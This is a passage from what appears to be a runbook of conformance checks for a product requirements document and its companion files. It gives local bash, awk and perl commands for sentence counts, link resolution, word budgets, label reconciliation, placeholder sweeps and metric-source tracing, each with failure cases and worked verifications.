map is **cleared when a table ends** (the first non-`|` line), so the next table's header is not
read as a data row against the previous table's width. `Pri` is emitted as `—` when the header has
no such column, which is the per-family shape above, produced rather than remembered. And a row
whose cell count does not match its header's is a **PARSE-MISS on stderr**, not a silently
mis-indexed triple — that is the guard against an unescaped `|` inside a `Requirement` cell, which
would otherwise shift every column after it. `split("", H)` is used rather than `delete H` because
both BSD and GNU awk accept it; the script was run under both and the output was identical.

**`bycolumn.awk` is this file's shared table parse.** Any check that needs a named column out of a
PRD table should read it through this map rather than counting pipes, because the column sets differ
per table today and a table that grows a column silently re-indexes every positional recipe that
reads it. Where a check does read positionally — check 20 takes the metrics `Method` cell as `$6`,
which is correct for `| ID | Metric | Definition … | Candidate target | Method | Status |` — the
header it assumes is written down beside it, so the assumption is checkable.

Verified against this skill's own example PRD: 14 triples, `E1|—|aligned` through `R2.4|P1|aligned`,
with the copy-index and metrics families carrying the literal `—` and the requirement rows carrying
real priorities, and **stderr silent**. An unescaped pipe injected into `R1.2`'s `Requirement` cell
produces `PARSE-MISS: row R1.2 has 7 cells, header has 6` and no triple for that row.

`E<n>` carries a status in **two** files, so the copy companion is an input to this check as well
as the PRD: assert the PRD copy index's `Status` and the copy companion's `- Status:` agree per
`E<n>`, at base and at HEAD. A disagreement is a MISS whether or not either side changed.

```bash
basefile="$(mktemp)"
git show "$lockbase:$docs/$slug.md" > "$basefile" \
  || { echo "NOT-RUN: no $slug.md at $lockbase (first lock, or wrong baseline)"; exit 3; }
[ -s "$basefile" ] || { echo "NOT-RUN: $slug.md at $lockbase is empty"; exit 3; }
```

Then parse both files' tables into `ID|Pri|Status` lines with `bycolumn.awk`, sort, and `diff`. Any
ID **added, removed or renumbered**, and any changed `Pri` or `Status` cell, must be **named in a
dated fence**. A PARSE-MISS on either side is a NOT-RUN for this check, not a clean diff: a row that
did not parse is a row neither side compared.

**Which fence, is where the second baseline comes back in.** Split the since-lock delta against this
amendment's delta, with the `comm` in the Applicability section's worked verification. A line in
both is this amendment's, and the fence that carries it is dated in this amendment. A line in the
since-lock delta only landed on the trunk between the lock and this branch point, and **it is not
this amendment's to fence**: the fence that carries it is whatever authorized it there, this check
asserts that such a fence exists, and the lock record names the line and the fence it found. A line
of the residue that no fence anywhere carries is a MISS against the document — pre-existing drift,
recorded as such, not as this amendment's unratified WHAT.

The expected result for a conversion is an empty diff apart from the fenced lines: an amendment is
not an implementation completion. Record both pairs — `(lockbase, head)` and `(changebase, head)` —
with the result, since this check reads both.

**Failure looks like.** A renumbered ID (never legal); a status flipped to `done` because the
rewrite describes behavior that has since been built; a priority quietly raised to match a sibling;
an `E<n>` marked `aligned` in the PRD's index and `pre-alignment` in the copy companion.

### 10. Two-sentence scan

**Method.** Over every requirement cell — and every other dispositionable rule cell — strip inline
code spans and link targets (keep the label), then count sentence terminators with:

```
[.!?]["')\]]*(?=\s+["'(\[]*[A-Z]|\s*$)
```

More than two is a candidate.

**Engine.** That pattern uses a lookahead, which POSIX ERE does not have: `grep -E` errors on it
and BSD `grep` has no `-P`. Run it under `perl -ne`, `python3 -m re`, or `rg -P`, and record which:

```bash
[ -s "$cells" ] || { echo "NOT-RUN: no dispositionable cells extracted"; exit 3; }
perl -ne 'print if (() = /[.!?]["\x27)\]]*(?=\s+["\x27(\[]*[A-Z]|\s*$)/g) > 2' -- "$cells"
```

Requiring a following capital or end-of-cell is what keeps `2.5` from counting. The earlier form of
this pattern used a `(?<![0-9])` lookbehind instead, which **under**-counted: it dropped every
sentence ending in a digit, so a three-sentence cell ending in numerals never reached the human's
list at all — while the prose warned only about over-counting. This form still over-counts on
abbreviations ("e.g.") and still misses a terminator followed by a sentence opening with a digit or
a lowercase word. So treat its hits as **a list to read, not a verdict**; the rule itself is
process rule 7 and a human confirms each hit.

**Failure looks like.** A three-sentence row where the third sentence carries rationale, an evidence
cite or a fence cite — all of which belong outside the cell.

### 11. Companion paths and link/anchor resolution

**Two sets, and only the first is non-empty by construction.** This format does not link its
companions — the PRD's Companions line writes them as **backticked paths**, not as
`[label](target)` — so the Markdown-link set over a conforming document tree is legitimately
**empty**, while the declared-companion set always exists. An earlier form of this check collected
only Markdown links and called that set non-empty by construction, citing the Companions line as
the four it carries. It carries none. Instantiated in isolation, a conforming PRD and its four
companions yield **zero** Markdown links in all five files, so the check was NOT-RUN on every
conforming document — and where some unrelated linked file happened to sit in the tree, the
non-empty guard was satisfied by that file while the four companion paths went unvalidated. That is
the guard passing on the wrong subject, which is the defect this whole file is written against.

**Method, part 1 — the declared companion paths.** Parse the Companions line's paragraph for its
backticked `.md` paths, assert each resolves, assert each sits in `"$docs"`, and assert all four
companions are declared. The paths are written relative to the repository root, as the template
writes them, so resolve them from there:

```bash
[ -s "$prd" ] || { echo "NOT-RUN: $prd is absent or empty"; exit 3; }
# The template writes these paths as {{product-docs-dir}}/<prd-slug>-*.md, and the shipped
# convention substitutes a repo-root-relative directory. Where a project substitutes something
# else, set the base to match — and record in the lock record which base the run resolved against.
root="${COMPANION_BASE:-$(git rev-parse --show-toplevel)}"
echo "resolving companion paths against: $root"
companions="$(mktemp)"
{ awk '/^Companions:/ {c=1} c && /^[[:space:]]*$/ {exit} c' "$prd" \
    | grep -oE '`[^`]+\.md`' || true; } | tr -d '`' | sort -u > "$companions"
[ -s "$companions" ] \
  || { echo "NOT-RUN: no companion paths parsed from the Companions line in $prd"; exit 3; }
while IFS= read -r c; do
  [ -f "$root/$c" ] \
    || printf 'MISS  companion %s is declared on the Companions line and does not exist\n' "$c"
  case "$c" in "$docs"/*) ;;
    *) printf 'MISS  companion %s is declared outside %s\n' "$c" "$docs" ;;
  esac
done < "$companions"
for suffix in -journeys.md -copy.md -fences.md -oq-results.md; do
  grep -qF -e "$slug$suffix" -- "$companions" \
    || printf 'MISS  the Companions line declares no %s companion\n' "$suffix"
done
```

**Worked verification — the five files in isolation.** A scratch repository containing only
`docs/product/` and the five generated documents: no `README.md`, no other linked file, nothing the
guard could pass on by accident.

| State | Result |
|---|---|
| all five present and declared | `companions declared: 4`, no MISS — **PASS** |
| the copy companion deleted from disk | `MISS companion …-copy.md … does not exist` |
| the fences companion dropped from the line, file present | `MISS … declares no -fences.md` |
| a companion declared outside `$docs` | both the does-not-exist MISS and the outside-`$docs` MISS |
| the Companions line removed entirely | `NOT-RUN: no companion paths parsed`, exit 3 |

The second and third rows are the two ways a companion can go missing — the file, or its
declaration — and the check reaches a verdict on both. The fourth is the subject genuinely failing
to parse, which stays NOT-RUN.

**Method, part 2 — Markdown links and anchors.** Over the **whole product-docs tree**, not just this
PRD. Collect every `[label](target)`. This set is **legitimately empty on a conforming document**,
and an empty collection over a `$docs` that parsed is a **PASS** with nothing to resolve, not a
NOT-RUN — the subject here is the tree, and the tree was read. Where the set is non-empty: for a
target with a path part, resolve it relative to the containing file and assert the file exists.
For a `#anchor` part, compute the
anchor set of the target file by **GitHub's slug rules**, applied to the heading's **rendered
text**: first resolve inline markdown to its text content — `**bold**`, `_emphasis_`, `` `code` ``
and `[label](target)` all reduce to the label or the inner text — then lowercase what remains; drop
everything that is not a letter, a digit, a space, a hyphen or an underscore (so `.`, `,`, `:`,
`(`, `)`, `'`, `"` and emoji all disappear); replace each space with a hyphen; keep existing
hyphens; and where two headings slug identically, the second and later get `-1`, `-2` … in document
order. Assert the anchor is in that set.

**Failure looks like.** A Companions line naming a companion the rewrite renamed or never created,
which is four paths a reader follows to nothing — the state check 15's `<prd-slug>` sweep catches
only when the token was left unsubstituted, and nothing caught when it was substituted wrongly. A
companion declared outside the product-docs directory. A link to a file the rewrite renamed; an
anchor that renders to nothing on GitHub because the heading it names carries a code span or
trailing punctuation the slug drops; an
anchor computed from the raw heading source, which keeps the asterisks a reader never sees. The
stable `### UJ n. <name>` headings in the journeys companion exist so this check keeps passing
across amendments — a heading reworded is a broken anchor in every sibling.

### 12. Word count by the fixed method

**Method.** PRD body only for the budget; companions excluded from it. Strip, in this order: HTML
comments, fenced code blocks, link targets (keeping the label), and table pipes including the `---`
separator rows. Count whitespace-separated tokens in what is left.

````bash
[ -s "$prd" ] || { echo "NOT-RUN: $prd is absent or empty"; exit 3; }
perl -0777 -pe 's/<!--.*?-->//gs; s/^```.*?^```//gms; s/\[([^\]]*)\]\([^)]*\)/$1/g;
                s/^\s*\|[-: |]+\|\s*$//gm; s/\|/ /g' -- "$prd" | wc -w
````

Compare against the project-supplied budget (default 12,000).

Two properties of that command are worth knowing rather than discovering. Without the guard above
it, a mistyped slug makes it print `0` and exit `0`, and zero words is under every budget — the
typo reads as a pass; `set -o pipefail` is what stops a `perl` failure from reaching `wc -w` as an
empty stream. And the fenced-block strip matches only a **closing fence at column 0**, so a code
block indented inside a list item is not stripped and its contents are counted; unindent it or
strip it by hand, and say in the record which was done.

**Report the companions' counts beside the body count**, by the same method, as **unbudgeted
context — not a budget.** The body number can improve while the thing it proxies gets worse: prose
moved out of the body into a companion lowers the count and raises the total a reader must hold,
and the budget alone cannot see it. A body drop paired with a companion jump is the signature of a
rule migration, not a compaction.

**Rule migration.** In each companion, find every sentence carrying a modal — `must`, `may not`,
`is shown`, `renders` — and assert it sits adjacent to a citation of an owning row ID in the same
cell, line or bullet.

Scan only each companion's **content** section — everything from its first content heading onward
(`## States`, `## Journeys`, `## Fences`, or the OQ-results companion's first `## OQ <id>`, which is
that file's first content heading by construction). What precedes that heading is the format
describing itself: the render-semantics paragraph, the phase-mark grammar, the harness statement.
Those sentences carry modals by their nature ("`Headline:` — the headline as it renders") and cite
no row because they are not product rules, so scanning them reports the template's own prose as a
migrated rule on every conforming document — a false alarm that would train an orchestrator to
ignore the check's real hits:

```bash
for f in "$journeys" "$copy" "$fences" "$oq"; do
  [ -s "$f" ] || { echo "NOT-RUN: $f is absent or empty"; continue; }
  content=$(mktemp)
  awk '/^## (States|Journeys|Fences|Results|OQ)([^A-Za-z0-9]|$)/ {c=1} c' "$f" > "$content"
  if [ ! -s "$content" ]; then
    if grep -qE '^## ' -- "$f"; then
      echo "NOT-RUN: $f carries ## sections the content marker did not match"
      grep -nE '^## ' -- "$f"
    else
      echo "PASS: $f parses and carries no content section — empty applicable set"
    fi
    rm -f "$content"; continue
  fi
  printf '\n== %s\n' "$f"
  grep -nE 'must|may not|is shown|renders' "$content" \
    | grep -vE '(R[0-9]+\.[0-9]+[a-z]?|E[0-9]+|M[0-9]+)' || echo '   (none uncited)'
  rm -f "$content"
done
```

**The empty content section is a real state, and only one of its two causes is a NOT-RUN.** The
OQ-results companion carries one `## OQ <id>` section per **answered** open question, so a PRD with
no answered open question has a companion that is complete and correct and has no `## OQ` heading at
all — and that is the normal state of a PRD whose questions are all still open, or of one that has
none. Making it NOT-RUN prices a fully specified feature at an owner fence, which is the same defect
as check 7's old zero-row rule. So the guard splits on whether the file carries **any** `##` heading:
none at all means a complete file describing an empty set, and this check passes over it with
nothing to scan; `##` headings the extraction marker did not match means the marker missed the
content, which is the exact false green the materialised `$content` was added for, and that stays
NOT-RUN — now naming the headings it found, so the reason is diagnosable rather than a shrug.

**Worked verification — the no-answered-OQ state.** Three versions of one results companion. As
shipped, with `## OQ 1`, it extracts 18 lines and the modal scan runs. Truncated to its preamble,
with the `## OQ 1` section removed, it reports
`PASS: … parses and carries no content section — empty applicable set`. With `## OQ 1` renamed to
`## Answer 1` — an answered question the marker cannot see — it reports
`NOT-RUN: … carries ## sections the content marker did not match` and prints `7:## Answer 1`. The
middle state is the one this check used to block lock on. The third is the one it must never stop
blocking on, and the two are told apart by the `##` grep and nothing else.

Three things in that command are load-bearing, and each was a live false green before it was fixed.
**`awk` takes no `--`**: it reads the marker as a filename and dies (`awk: can't open file --`) on
both BSD and GNU awk. **`\b` is not a word boundary in an awk ERE**: BSD awk has no such escape and
GNU awk spells it `\y`, so `\b` matches a backspace, the heading never matches, and the extraction
is empty. **An empty extraction is indistinguishable from a clean one** once it reaches the grep,
which prints `(none uncited)` and reads as PASS over a file nothing was searched in. Hence the
materialised `$content` and the `[ -s ]` guard: a companion whose content section **failed to**
extract is NOT-RUN, not PASS. What the guard must not do is conflate that with a companion that has
no content section to extract, which the branch above separates.

A modal sentence in a companion's content with no owning-row cite is a rule that has left its home,
which process rule 11 forbids: a rule lives in an ID-carrying row and everything else restates and
cites.

**Failure looks like.** Over budget. The response is a compaction pass under process rules 7, 8 and
11 — trim rule-free prose, move restatement out. Never raise the budget; a document that cannot fit
is two PRDs. Or a body count that fell while a companion's rose, with an uncited modal sentence in
that companion to say where the rule went.

### 13. The standing label check, run

**Method.** The copy index's Labels rule makes the copy companion the one home for a user-facing
label. **This check is the run that enforces it** — the locked document states the rule and this
file carries the search, so the check is the run, not the existence of a command anywhere. Both
directions run; each is what finds one of the two failures below.

*Direction 1 — every label, out into the tree.* The copy companion's quote marks identify a
checkable label: the `- Actions:` and `- Variant:` lines carry them and the prose fields do not.
Extract those labels and search the tree for each, passing the label as a quoted variable:

```bash
for f in "$copy" "$prd" "$journeys"; do
  [ -s "$f" ] || { echo "NOT-RUN: $f is absent or empty"; exit 3; }
done
labels="$(mktemp)"
fields="$(grep -cE '^- (Actions|Variant):' -- "$copy" || true)"
[ "$fields" -gt 0 ] || { echo "NOT-RUN: no Actions/Variant fields parsed from $copy"; exit 3; }
{ grep -hE '^- (Actions|Variant):' -- "$copy" | grep -o '"[^"]*"' || true; } \
  | sed 's/^"//; s/"$//' | sort -u > "$labels"
while IFS= read -r label; do
  printf '\n== %s\n' "$label"
  grep -rn --fixed-strings --include='*.md' -e "$label" -- "$docs" || echo '   (no other mention)'
done < "$labels"
```

Every label must be written once in the copy companion and only **quoted** elsewhere.

The guard is on the **fields**, not on the labels, because the copy template makes `- Actions: none`
and an absent `- Variant:` line legal: a state that offers no action and has no variant contributes
no label, and a companion in which no state does contributes none at all. Fields present with zero
quoted labels is a parsed subject with a legitimately empty applicable set — direction 1 is a PASS
over it, and direction 2 then carries the whole check, since with no label on offer *any* quoted
string in a row or a case is a string no copy state provides. Zero `- Actions:`/`- Variant:` lines
is the different thing: the field names moved or the sections did not parse, and that is NOT-RUN.

The braces around the extraction pipeline are not decoration. Written bare, its `grep -o` returns
`1` on the zero-label companion and `set -o pipefail` aborts the whole script there — silently,
before direction 2 runs at all — so the one state this guard exists to admit was the one state the
command could not survive. Direction 2's extraction is braced for the same reason.
Verified on three versions of one copy companion — as shipped, 5 fields and 4 labels; every
`Actions:` set to `none` and the `Variant:` lines removed, 3 fields and 0 labels, PASS; the fields
renamed to `Buttons:`/`Variants:`, 0 fields, NOT-RUN.

*Direction 2 — every quoted string in a row or a case, back into the copy companion.* Extract every
quoted string from the requirement rows and from the journeys companion's `When` and `Assert`
cells, and assert each resolves character-for-character to a label the copy companion provides:

```bash
quoted="$(mktemp)"; bodies="$(mktemp)"
{ awk '/^\| *R[0-9]+\.[0-9]+[a-z]? *\|/' "$prd"
  awk -F'|' '/^\| *(T[0-9]+|UJ[0-9]+\.[0-9]+-[a-z]) *\|/ {print $4 $5}' "$journeys"; } > "$bodies"
[ -s "$bodies" ] || { echo "NOT-RUN: no rows or case cells extracted from $prd / $journeys"; exit 3; }
{ grep -o '"[^"]*"' -- "$bodies" || true; } | sed 's/^"//; s/"$//' | sort -u > "$quoted"
comm -23 "$quoted" "$labels"   # quoted in a row or a case; provided by no copy state
```

The guard is on `$bodies` — rows and cases exist by construction, so an empty extraction there is a
parse failure — and not on `$quoted`, which is legitimately empty when no row and no case quotes
anything. An empty `$quoted` against a parsed `$bodies` is a PASS, and `comm` over it prints
nothing, which is the same output a clean run gives; the guard above is what makes the two
distinguishable in the record.

Direction 1 alone cannot find this: it seeds only from the copy companion, so an action a row names
that no copy state provides produces no seed and is structurally invisible to it.

**Failure looks like.** A label with a second home — a row or a journey that states the string
instead of quoting it, so the two drift. Or an action a row names that no copy state provides,
which is a builder inventing user-facing text at build time.

### 14. Post-lock ticks true and attributed to a change record

**Method.** A diff check (see Applicability). **This check runs against the change baseline**,
`$changebase`, because a tick may only be attributed to the change record that actually made it: the
question is which ticks are *this amendment's*. Against the preservation baseline it also collects
every tick the trunk flipped since the lock and files them in this amendment's lock record, which is
a claim this amendment cannot support. For every checkbox this change flips to ticked, do
both: read the text it claims and assert the claim is true of the document as it now stands; and
assert the tick's attribution names **a change record that survives a squash-merge** — a pull
request, a merge request, or an equivalent changeset reference with a stable identifier. A bare
commit SHA is not one.

```bash
diff_out="$(mktemp)"
git diff "$changebase"...HEAD -- "$docs" > "$diff_out"
[ -s "$diff_out" ] \
  || { echo "NOT-RUN: empty diff against $changebase — wrong baseline, or nothing changed"; exit 3; }
grep -E '^\+.*\[[xX]\]' -- "$diff_out" || true
```

The tick pattern is case-insensitive on the mark: `- [X]` renders as ticked, so a `\[x\]` pattern
misses every capitalized tick and reports a clean run over a document it never looked at. An empty
result against a non-empty diff is a **PASS** — this amendment ticked nothing, which is a legitimate
empty applicable set and the common case — and the `[ -s "$diff_out" ]` guard above is what
separates it from a diff that did not resolve. Record the `(changebase, head)` pair with the result,
naming the baseline.

**Failure looks like.** A tick whose claim the text does not support — the item was ticked because
it was discussed. Or a tick attributed to a SHA, which stops resolving the moment the branch is
squashed on merge, leaving an item that claims to be closed by nothing a reader can open.

### 15. Unresolved fill

**What.** Both placeholder families are gone, in the PRD and in all four companions.

**Method.** `{{param}}` is substituted at scaffold time and `_(prompt)_` is filled during
authoring; an unresolved instance of **either** is a lock-blocking defect. Sweep for both, and
separately for the `<prd-slug>` token, which is a substitution parameter outside the `{{…}}` family
and which the `{{…}}` sweep therefore cannot see:

```bash
files=("$prd" "$journeys" "$copy" "$fences" "$oq")
for f in "${files[@]}"; do
  [ -s "$f" ] || { echo "NOT-RUN: $f is absent or empty"; exit 3; }
done
grep -nE '\{\{|_\([^)]*\)_' -- "${files[@]}" || true
grep -nF -e '<prd-slug>' -- "${files[@]}" || true
```

Both must return nothing.

**Failure looks like.** A fence whose `**Authority:**` still reads `_(link to the owner comment or
decision that made this.)_` — every fence then cites nothing, and the ratification chain the whole
format rests on is hollow while every other check passes. Or a locked PRD whose Companions line
still reads `<prd-slug>-journeys.md`, naming four paths that resolve to nothing.

### 16. Guidance comments deleted

**What.** No template guidance survives into the locked document.

**Method.**

```bash
grep -rn -e '<!-- guidance' --include='*.md' -- "$docs" || true
```

Must return nothing. Scope it to the PRD and its four companions if the tree carries other
documents that legitimately use the marker.

Nothing else in this file can find an undeleted block. Check 12 strips HTML comments before
counting, so guidance costs nothing against the word budget; no other check parses comments at all.

**Failure looks like.** A builder reading the locked document and finding instructions for filling
a template — "Reshape a section that does not fit the product" — and reading them as rules of the
product.

### 17. Banned adjectives in asserts

**What.** Every `Assert` cell names a value, a state or a count.

**Method.** Over the journeys companion's case tables — the transition index and every `UJ` table:

```bash
[ -s "$journeys" ] || { echo "NOT-RUN: $journeys is absent or empty"; exit 3; }
asserts="$(mktemp)"
awk -F'|' '/^\| *(T[0-9]+|UJ[0-9]+\.[0-9]+-[a-z]) *\|/ {print $5}' "$journeys" > "$asserts"
[ -s "$asserts" ] || { echo "NOT-RUN: no case rows parsed from $journeys"; exit 3; }
grep -niE 'correct|unchanged|appropriate|as expected' -- "$asserts" || true
```

Must return nothing. Process rule 10 is this format's central oracle rule and nothing else here
tested it; this is four words and one grep.

**Failure looks like.** An `Assert` reading "the counts are correct" or "the list is unchanged" — a
builder cannot write that test, and a reviewer reading the row sees an oracle where there is none.

### 18. Test-controls map reconciliation, and every asserted value traced to its source

**What.** Two halves. Every surface a case drives is declared, in the journeys companion's
test-controls map or in its Named defaults table — and every value a case **asserts** is supplied,
by that case's `Given`, by a named default, or by a case the journey's declared continuity carries
it from.

**Method, direction 1 — surfaces.** Parse two declared sets, because they answer different
questions: the **map's `Surface` column** is what a case can DRIVE, and the Named defaults table's
`Seam input` column is what a case may leave UNDECLARED. Parse the case set: every `When` cell of
the transition index and the `UJ` tables. Then produce two lists — for each surface in the map, the
cases that drive it (a declared surface no case drives), and each `When` cell that matches neither
declared set. **The undriven-surface limb ranges over the map only.** A named default is supplied,
not driven, so including it there reports every unmentioned default as undriven on a conforming
document — two standing false alarms on this skill's own example, and a check whose output is
mostly false alarms stops being read. Both
parses are guarded, and both sets are non-empty **by construction**: the journeys template makes the
map and the case tables unconditional, so an empty parse of either is an extraction failure and is
NOT-RUN. The second list is read by a human, because a `When` cell is prose; the enumeration is what
is mechanical.

The journeys template says this map is what makes the harness statement's "declare every exercised
seam input" checkable, and nothing reconciled cases against it — so the map could be complete,
empty or stale and every other check still passed.

**Method, direction 2 — asserted values.** Declaring the surface is not the same as supplying the
datum that comes back through it. A case can drive a fully declared surface and still assert a
value that nothing in this document gives a builder any way to produce, and direction 1 cannot see
it: it reads `When` cells and this defect lives in `Assert` cells. So trace each asserted datum back
to a declared source.

The **datum classes** are the values a fixture supplies and a requirement row cannot: destinations
and other URLs, identifiers (short codes, account ids, tokens), and instants. Those three are what
the `$datum` pattern below implements, and the prose claims no more than the pattern does. A bare
**quantity** — a count, a numerator, a denominator — is the fourth class by rights, and is
deliberately NOT matched: a pattern loose enough to catch `4` catches every number in every cell,
and the resulting noise would bury the hits that matter. Trace quantities by reading the case, and
say in the lock record that you did. A value the rows *state* — an HTTP status, a state name, a
copy-state `E<n>`, a variant label — is out of scope here and is owned elsewhere: check 7 owns
constants, check 6 owns copy states, check 13 owns quoted labels, check 17 owns the adjective case.
Keeping the classes narrow is what keeps this check's output short enough to read.

The **source set** for a case is its own `Given` and `When` cells, plus the whole `Default` column
of the Named defaults table, plus — only where the journey's preamble line declares continuity for
that scenario — the `Given`, `When` and `Assert` cells of the earlier cases in the same scenario.
Continuity is prose, so the orchestrator reads each journey preamble once and writes the scenario
prefixes that carry it into `$continuity`, one per line; that is the one hand step, and it is
recorded. Where no preamble declares continuity the file is empty and the harness's reset rule
applies unmodified.

```bash
[ -s "$journeys" ] || { echo "NOT-RUN: $journeys is absent or empty"; exit 3; }
defaults="$(mktemp)"; cases="$(mktemp)"; src="$(mktemp)"
continuity="$(mktemp)"   # one scenario prefix per line, e.g. UJ1.1 — read off the journey preambles
datum='[a-z][a-z0-9+.-]*://[^ ,)]+|[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9:]+Z|[A-Za-z]+-[0-9]{3,}|[a-z]+[0-9]{3,}'
awk -F'|' '/^\| *Seam input *\| *Default *\|/ {h=1; next} h && /^\| *-+/ {next}
           h && /^\|/ {print $3; next} h {exit}' "$journeys" > "$defaults"
[ -s "$defaults" ] || { echo "NOT-RUN: Named defaults table parsed empty"; exit 3; }
awk -F'|' '/^\| *(T[0-9]+|UJ[0-9]+\.[0-9]+-[a-z]) *\|/ {gsub(/^ +| +$/,"",$2);
           print $2 "\t" $3 "\t" $4 "\t" $5}' "$journeys" > "$cases"
[ -s "$cases" ] || { echo "NOT-RUN: no case rows parsed from $journeys"; exit 3; }
while IFS=$'\t' read -r id given when assert; do
  { printf '%s\n%s\n' "$given" "$when"; cat "$defaults"; } > "$src"
  scen="${id%-*}"
  if grep -qxF -e "$scen" -- "$continuity"; then
    awk -F'\t' -v s="$scen" -v me="$id" \
      '$1 ~ "^" s "-" && $1 < me {print $2; print $3; print $4}' "$cases" >> "$src"
  fi
  { printf '%s\n' "$assert" | grep -oE "$datum" || true; } | sort -u | while IFS= read -r v; do
    grep -qF -e "$v" -- "$src" \
      || printf 'MISS  %s asserts %s — supplied by no Given and no named default\n' "$id" "$v"
  done
done < "$cases"
```

A hit is a **MISS**, not a list to read: the case names a value and the document says nowhere where
it comes from, so a builder writing that test has to invent it. The fix is the same either way — put
the value in the case's `Given`, or define a named fixture the case uses explicitly.

An empty result against a parsed `$cases` is a **PASS**: every asserted datum traced. The guards on
`$defaults` and `$cases` are what make that PASS mean something, since both are non-empty by
construction and an empty one means the parse missed the table rather than that the document is
clean.

The braces around the `grep -oE "$datum"` are load-bearing for the same reason as check 13's. An
`Assert` cell carrying no datum-class token — "The response status is HTTP 410" — makes that `grep`
return `1`, and under `set -o pipefail` the bare pipeline aborts the whole loop at that case.
Observed: with T2's `Assert` reduced to exactly that, the unbraced form exited `1` after printing
nothing at all, so a document with one status-only assert silently skipped every case after it and
its empty stdout read as clean. Braced, the same run reports T4 and completes.

**Worked verification.** Run against this skill's own example journeys companion as it ships, the
trace is **silent**: every asserted datum traces to a `Given`, to a named default, or to a case the
declared continuity carries it from. The demonstration therefore runs against a stated **mutation**
of that fixture — remove the destination from T4's `Given` — which returns exactly one line:

```
MISS  T4 asserts https://example.com/a-very-long-article-slug — supplied by no Given and no named default
```

Anchoring it to a mutation rather than to the shipped file is deliberate, and it is a correction: an
earlier draft of this check quoted that line as the example's own output, which pinned the check's
evidence to a **defect in the conformance fixture**. A fixture exists to demonstrate conformance, so
repairing it silently invalidated the check's demonstration. A worked verification that only
reproduces while something is broken is evidence with an expiry date.

That mutation is the real defect a reviewer found by eye and direction 1 could not: with the
destination removed, T4's `Given` supplies the short code, the disabled state, the expiry and the
clock; the Named defaults supply a clock, a generator and an owner account; none supplies a
destination, and the T-cases declare no continuity, so the reset rule applies and T1's destination
cannot carry. Three further controls on the same fixture:
adding the destination to T4's `Given` clears the line and the run is silent; adding a value to one
case's `Assert` that only an **earlier case in the same scenario** supplies is clean with that
scenario listed in `$continuity` and a MISS without it, which is what proves the continuity limb
fires rather than passing everything; and `abc1235` in `UJ1.1-b`'s `Assert` is silent throughout
because the Named defaults' generator seed names it — a datum traced to a default rather than to a
`Given`.

**Failure looks like.** A case driving a surface the map does not declare — asserting through a
seam nobody declared, which is exactly what the harness statement forbids. Or a map line for a
surface no case drives, which is a control nothing exercises. Or a case asserting an exact URL, id
or instant that no `Given` and no named default supplies, which is a builder inventing fixture data
at build time — the same defect as check 13's uncovered label, one column over.

### 19. Exactly one priority semantic

**What.** Exactly one of the Legend's two priority-semantics bullets survives to lock.

**Method.**

```bash
[ -s "$prd" ] || { echo "NOT-RUN: $prd is absent or empty"; exit 3; }
grep -cE '^- \*\*(Build order within the release|Cut line)' -- "$prd"
```

The count must be exactly `1`. Two is the template shipped unresolved; zero is as bad and is a MISS
just as loudly — with neither bullet the `Pri` column has no declared meaning at all, and Phase 5's
priority pass has nothing to answer against.

**Failure looks like.** Both bullets left in place, so this document's `Pri` has two readings at
once — and check 1b then compares a build-order `P1` here against a cut-line `P1` in a sibling and
reports that the two documents agree.

---

### 20. Every success metric reads an observable its source row states

**What.** A metric row's `Method` names where the number comes from. That source must exist as a
row, and that row must actually state the observable the `Method` reads.

**Method.** For each `M<n>` row, extract the row IDs its `Method` cell cites. Assert each resolves
to a live row, and then — the half that matters — assert that row's text names the thing the
`Method` says it reads. This is check 7's reverse assertion, one table over: check 7 asks whether a
declared constant is named in an owning row; this asks whether a metric's declared source actually
supplies what the metric counts.

```bash
set -euo pipefail
rows=$(mktemp); metrics=$(mktemp)
awk -F'|' '/^\| *(R[0-9]+\.[0-9]+[a-z]?) *\|/ {gsub(/^ +| +$/,"",$2); print $2 "\t" $0}' "$prd" > "$rows"
awk -F'|' '/^\| *M[0-9]+ *\|/ {gsub(/^ +| +$/,"",$2); print $2 "\t" $6}' "$prd" > "$metrics"
[ -s "$metrics" ] || { echo "NOT-RUN: no metric rows parsed from $prd"; exit 3; }
while IFS=$'\t' read -r id method; do
  cited=$({ printf '%s\n' "$method" | grep -oE 'R[0-9]+\.[0-9]+[a-z]?' || true; } | sort -u)
  [ -n "$cited" ] || { echo "MISS  $id: Method cites no source row"; continue; }
  for r in $cited; do
    line=$(grep -F "$r	" "$rows" | head -1 || true)
    [ -n "$line" ] || { echo "MISS  $id: Method cites $r, which resolves to no row"; continue; }
    printf '  %s -> %s : %s\n' "$id" "$r" "$(printf '%s' "$line" | cut -c1-120)"
  done
done < "$metrics"
rm -f "$rows" "$metrics"
```

The resolution half is mechanical; the **does the row state that observable** half is read, one
printed line per pair, and its verdict is recorded. That split is deliberate: whether "the
status-class counter R2.3 bounds" is actually bounded by R2.3 is a reading, and a regex that claimed
to decide it would be the kind of check this file spends its length warning about.

**Failure looks like.** A metric counting something its source row forbids retaining — the source
row bounds a log to three fields and the metric counts a fourth, so an agent must either break the
stated contract or invent an observation mechanism. A `Method` citing a row that does not exist, or
citing none at all, which leaves the number with no stated origin.

**Why this check exists.** It was added because a reviewer found exactly that defect in this skill's
own worked example — a metric computed from an access log "counted by status code" whose source row
permitted retaining no status — and **no check in this file would have caught it**. Checks 18 and 6
range over acceptance cases, check 7 over constants; the metrics table's `Method` column had no
reader at all. The format's whole claim is that a builder never has to guess, and a metric with an
unobservable source is a guess with a number attached.

## When the checks run

**The clean result must belong to the document that locks.** The checks run **before the pre-lock
round**, and **again after the last edit of that round's fix pass** — that second run is the state
that actually locks.

**Any edit after a clean result re-runs all of them.** A row, an Open Question, a fence, the Legend,
the fence-to-row map, the transition index, a companion file — and an editorial edit is still an
edit for this purpose. **A result recorded for an earlier state does not carry forward**, and the
review log records which revision each run covered so that a later reader can tell. A diff check
also records which baseline it used and the `(baseline, head)` pair it ran against; without that
pair its result is not a result.

**Clean means PASS, not silence.** The lock record lists every check by number with its PASS, MISS
or NOT-RUN, and lock requires zero MISSes and zero NOT-RUNs — except the diff checks the
Applicability section records NOT-RUN on a first lock, and any other NOT-RUN the owner accepts by
name in a dated fence.

The same checks re-run before any re-lock: a refactor of a locked PRD, a companion split, an
amendment that moves rows, and the bookkeeping close of a conversion.
